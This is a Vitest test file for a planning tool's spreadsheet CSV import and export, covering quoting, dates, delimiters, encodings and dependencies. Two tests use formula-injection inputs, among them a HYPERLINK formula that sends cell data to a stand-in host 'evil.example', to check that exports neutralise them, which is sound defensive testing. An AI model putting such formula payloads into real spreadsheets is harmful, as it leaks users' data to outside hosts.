import { describe, it, expect } from "vitest";
import { exportSpreadsheetCsv, importSpreadsheetCsv, decodeTextBytes } from "../src/spreadsheet.js";
import { exportToCsv } from "@jantt/core";
import type { JanttData } from "@jantt/core";

describe("Spreadsheet CSV Interoperability", () => {
  const plan: JanttData = {
    tasks: [
      { id: "A1", label: "Market Research, Phase 1", start: "2026-11-01", end: "2026-11-04", progress: 1, owner: "Sarah", category: "marketing" },
      { id: "A2", label: "UI Concept \"V2\"", start: "2026-11-05", end: "2026-11-10", progress: 0.45, owner: "Leo", category: "design", dependsOn: "A1:FS+1d", priority: "urgent" }
    ]
  };

  it("exports CSV with quotes, formulas and metadata", () => {
    const csv = exportSpreadsheetCsv(plan);

    expect(csv).toContain("ID,Label,Start,End,Progress,Category,Owner,DependsOn,Priority");
    expect(csv).toContain("\"Market Research, Phase 1\"");
    expect(csv).toContain("\"UI Concept \"\"V2\"\"\"");
    expect(csv).toContain("100%");
    expect(csv).toContain("45%");
    expect(csv).toContain("urgent");
  });

  it("imports CSV back into Jantt tasks cleanly", () => {
    const csv = exportSpreadsheetCsv(plan);
    const parsed = importSpreadsheetCsv(csv);

    expect(parsed.tasks).toHaveLength(2);
    expect(parsed.tasks[0].id).toBe("A1");
    expect(parsed.tasks[0].label).toBe("Market Research, Phase 1");
    expect(parsed.tasks[0].owner).toBe("Sarah");
    expect(parsed.tasks[0].progress).toBe(1);

    expect(parsed.tasks[1].id).toBe("A2");
    expect(parsed.tasks[1].label).toBe("UI Concept \"V2\"");
    expect(parsed.tasks[1].priority).toBe("urgent");
    expect(parsed.tasks[1].progress).toBe(0.45);
    expect(parsed.tasks[1].dependsOn).toBe("A1:FS+1d");
  });

  it("prefixes a UTF-8 BOM by default and can omit it", () => {
    expect(exportSpreadsheetCsv(plan).startsWith("\uFEFFID,")).toBe(true);
    expect(exportSpreadsheetCsv(plan, { bom: false }).startsWith("ID,")).toBe(true);
  });

  it("neutralizes spreadsheet formulas on export and restores them on import", () => {
    const hostile: JanttData = {
      tasks: [
        { id: "=1+1", label: "=HYPERLINK(\"https://evil.example/?\"&A1,\"click\")", start: "2026-11-01", end: "2026-11-02", category: "@SUM(A1)", owner: "+cmd" },
        { id: "q1", label: "'=already quoted", start: "2026-11-01", end: "2026-11-02", category: "dev", owner: "-x" }
      ]
    };
    const csv = exportSpreadsheetCsv(hostile, { bom: false });
    const lines = csv.split("\r\n").slice(1);
    for (const line of lines) {
      for (const field of line.split(/,(?=(?:[^"]*"[^"]*")*[^"]*$)/)) {
        expect(/^"?[=+\-@]/.test(field)).toBe(false);
      }
    }

    const parsed = importSpreadsheetCsv(csv);
    expect(parsed.tasks[0].id).toBe("=1+1");
    expect(parsed.tasks[0].label).toBe(hostile.tasks[0].label);
    expect(parsed.tasks[0].category).toBe("@SUM(A1)");
    expect(parsed.tasks[0].owner).toBe("+cmd");
    expect(parsed.tasks[1].label).toBe("'=already quoted");
    expect(parsed.tasks[1].owner).toBe("-x");
  });

  it("neutralizes full-width formula characters like the core exporter", () => {
    const csv = exportSpreadsheetCsv({
      tasks: [{ id: "w1", label: "＝HYPERLINK(\"https://evil.example\")", start: "2026-11-01", end: "2026-11-02", category: "dev", owner: "＠me" }]
    }, { bom: false });
    expect(csv).toContain("\"'＝HYPERLINK(");
    expect(csv).toContain(",'＠me,");
    const [task] = importSpreadsheetCsv(csv).tasks;
    expect(task.label).toBe("＝HYPERLINK(\"https://evil.example\")");
    expect(task.owner).toBe("＠me");
  });

  it("round-trips milestones, status, cost and notes in columns after Priority", () => {
    const source: JanttData = {
      tasks: [
        { id: "g", label: "Gate", category: "pm", start: "2026-11-09", end: "2026-11-09", milestone: true, status: "completed", estimatedCost: -250.5, notes: "=not a formula\nline 2" },
        { id: "d", label: "One day", category: "pm", start: "2026-11-10", end: "2026-11-10", description: "From description" }
      ]
    };
    const csv = exportSpreadsheetCsv(source, { bom: false });
    expect(csv.split("\r\n")[0]).toBe("ID,Label,Start,End,Progress,Category,Owner,DependsOn,Priority,Milestone,Status,EstimatedCost,Notes");
    expect(csv).toContain(",TRUE,completed,-250.5,\"'=not a formula");

    const [gate, day] = importSpreadsheetCsv(csv).tasks;
    expect(gate).toMatchObject({ milestone: true, status: "completed", estimatedCost: -250.5, notes: "=not a formula\nline 2" });
    // A single-day task stays a one-day task: only the flag makes a milestone.
    expect(day.milestone).toBeUndefined();
    expect(day.notes).toBe("From description");
    expect(day.estimatedCost).toBeUndefined();
  });

  it("imports the core exportToCsv format (as written by @jantt/mcp)", () => {
    const plan: JanttData = {
      tasks: [
        { id: "a", label: "Design", category: "dev", start: "2026-11-02", end: "2026-11-06", progress: 0.5, status: "in-progress", notes: "Spec v2", estimatedCost: 1200 },
        { id: "m", label: "Gate", category: "dev", start: "2026-11-09", end: "2026-11-09", milestone: true, dependsOn: "a:SS+2d" }
      ]
    };
    const [design, gate] = importSpreadsheetCsv(exportToCsv(plan)).tasks;
    expect(design).toMatchObject({ id: "a", label: "Design", category: "dev", progress: 0.5, status: "in-progress", notes: "Spec v2", estimatedCost: 1200 });
    expect(design.milestone).toBeUndefined();
    expect(gate).toMatchObject({ id: "m", label: "Gate", milestone: true, dependsOn: "a:SS+2d" });
  });

  it("keeps ids that look like lag shorthand and warns about unreadable costs", () => {
    const csv = exportSpreadsheetCsv({
      tasks: [
        { id: "render-3d", category: "dev", start: "2026-11-02", end: "2026-11-04" },
        { id: "qa", category: "dev", start: "2026-11-05", end: "2026-11-06", dependsOn: "render-3d" }
      ]
    });
    expect(importSpreadsheetCsv(csv).tasks[1].dependsOn).toBe("render-3d");

    const warnings: string[] = [];
    const [task] = importSpreadsheetCsv("ID,Start,Cost\na,2026-11-01,lots", { onWarning: (m) => warnings.push(m) }).tasks;
    expect(task.estimatedCost).toBeUndefined();
    expect(warnings[0]).toContain("lots");
  });

  it("round-trips progress without inflating low percentages", () => {
    const progressPlan: JanttData = {
      tasks: [0.01, 0.005, 1, 0.45].map((progress, i) => ({ id: `p${i}`, category: "dev", start: "2026-11-01", end: "2026-11-02", progress }))
    };
    const parsed = importSpreadsheetCsv(exportSpreadsheetCsv(progressPlan));
    expect(parsed.tasks.map((t) => t.progress)).toEqual([0.01, 0.005, 1, 0.45]);

    const raw = "ID,Start,Progress\na,2026-11-01,1%\nb,2026-11-01,0.5\nc,2026-11-01,150%\nd,2026-11-01,45\ne,2026-11-01,-5%";
    expect(importSpreadsheetCsv(raw).tasks.map((t) => t.progress)).toEqual([0.01, 0.5, 1, 0.45, 0]);
  });

  it("exports object-form dependencies, the lag alias and comma lists", () => {
    const depPlan: JanttData = {
      tasks: [
        { id: "a", category: "dev", start: "2026-11-01", end: "2026-11-02" },
        { id: "b", category: "dev", start: "2026-11-03", end: "2026-11-04", dependsOn: { id: "a", type: "SS", lag: 2 } },
        { id: "c", category: "dev", start: "2026-11-05", end: "2026-11-06", dependsOn: "a, b" },
        { id: "d", category: "dev", start: "2026-11-05", end: "2026-11-06", dependsOn: [{ id: "a", type: "FF", lagDays: -1 }, "b"] }
      ]
    };
    const parsed = importSpreadsheetCsv(exportSpreadsheetCsv(depPlan));
    expect(parsed.tasks[1].dependsOn).toBe("a:SS+2d");
    expect(parsed.tasks[2].dependsOn).toEqual(["a", "b"]);
    expect(parsed.tasks[3].dependsOn).toEqual(["a:FF-1d", "b"]);
  });

  it("skips tombstones and uses the name alias on export", () => {
    const csv = exportSpreadsheetCsv({
      tasks: [
        { id: "gone", category: "dev", start: "2026-11-01", end: "2026-11-02", _deleted: true },
        { id: "n1", name: "Named only", category: "dev", start: "2026-11-01", end: "2026-11-02" }
      ]
    });
    expect(csv).not.toContain("gone");
    expect(csv).toContain("n1,Named only,");
  });

  it("detects semicolon and tab delimiters", () => {
    const semicolon = importSpreadsheetCsv("ID;Name;Start;End;Progress\nA;\"Design; v2\";2026-11-01;2026-11-03;50%");
    expect(semicolon.tasks[0]).toMatchObject({ id: "A", label: "Design; v2", start: "2026-11-01", end: "2026-11-03", progress: 0.5 });

    const tsv = importSpreadsheetCsv("ID\tTask Name\tStart Date\tFinish\nB\tBuild, test\t2026-11-04\t2026-11-05");
    expect(tsv.tasks[0]).toMatchObject({ id: "B", label: "Build, test", start: "2026-11-04", end: "2026-11-05" });
  });

  it("normalizes spreadsheet date formats", () => {
    const csv = [
      "ID,Start,End",
      "a,11/1/2026,11/3/2026",
      "b,1-Nov-26,Nov 3 2026",
      "c,2026-11-01T08:00:00Z,2026/11/03",
      "d,46327,46329"
    ].join("\n");
    const tasks = importSpreadsheetCsv(csv).tasks;
    for (const t of tasks) {
      expect(t.start).toBe("2026-11-01");
      expect(t.end).toBe("2026-11-03");
    }

    // Any first part above 12 makes the whole file day-first.
    const dayFirst = importSpreadsheetCsv("ID,Start,End\na,03/11/2026,05/11/2026\nb,13/11/2026,14/11/2026").tasks;
    expect(dayFirst[0].start).toBe("2026-11-03");
    expect(dayFirst[1].end).toBe("2026-11-14");

    expect(importSpreadsheetCsv("ID,Start\na,03/11/2026", { dateFormat: "mdy" }).tasks[0].start).toBe("2026-03-11");
    expect(importSpreadsheetCsv("ID,Start\na,1.11.2026").tasks[0].start).toBe("2026-11-01");
  });

  it("warns about unreadable dates and keeps the raw value for validation", () => {
    const warnings: string[] = [];
    const tasks = importSpreadsheetCsv("ID,Start\na,next week", { onWarning: (m) => warnings.push(m) }).tasks;
    expect(tasks[0].start).toBe("next week");
    expect(warnings[0]).toContain("next week");
  });

  it("skips blank rows and generates ids that never collide", () => {
    const warnings: string[] = [];
    const csv = "ID,Label,Start\n,First,2026-11-01\n,,\n\n,Second,2026-11-02\nt1,Real t1,2026-11-03\n,,,,,";
    const tasks = importSpreadsheetCsv(csv, { onWarning: (m) => warnings.push(m) }).tasks;
    expect(tasks.map((t) => t.label)).toEqual(["First", "Second", "Real t1"]);
    expect(new Set(tasks.map((t) => t.id)).size).toBe(3);
    expect(tasks[2].id).toBe("t1");
    expect(warnings.some((m) => m.includes("generated"))).toBe(true);
  });

  it("handles quotes per RFC 4180 and reports unterminated fields", () => {
    const tasks = importSpreadsheetCsv("ID,Label,Start\nA1,12\" pipe,2026-11-01\nA2,\"multi\nline\",2026-11-02").tasks;
    expect(tasks).toHaveLength(2);
    expect(tasks[0].label).toBe("12\" pipe");
    expect(tasks[1].label).toBe("multi\nline");

    expect(() => importSpreadsheetCsv("ID,Label,Start\nA1,\"open,2026-11-01\nA2,x,2026-11-02")).toThrow(/line 2/);
  });

  it("rejects files that are not task spreadsheets", () => {
    expect(() => importSpreadsheetCsv("")).toThrow(/empty/);
    expect(() => importSpreadsheetCsv("Foo,Bar\n1,2")).toThrow(/Unrecognized spreadsheet/);
    expect(() => importSpreadsheetCsv("ID,Start\n,,\n")).toThrow(/no task rows/);
  });

  it("decodes UTF-8, UTF-16 and Windows-1252 bytes", () => {
    const ansi = new Uint8Array([...Buffer.from("ID,Label,Start\nA,Caf", "latin1"), 0xe9, ...Buffer.from(",2026-11-01", "latin1")]);
    expect(importSpreadsheetCsv(ansi).tasks[0].label).toBe("Café");

    const utf8 = new TextEncoder().encode("\uFEFFID,Label,Start\nA,Überprüfung,2026-11-01");
    expect(importSpreadsheetCsv(utf8).tasks[0].label).toBe("Überprüfung");

    const utf16 = new Uint8Array([0xff, 0xfe, ...Buffer.from("ID\tLabel\tStart\nA\t漢字\t2026-11-01", "utf16le")]);
    expect(importSpreadsheetCsv(utf16.buffer).tasks[0].label).toBe("漢字");

    expect(decodeTextBytes(new Uint8Array([0x80]))).toBe("€");
  });
});
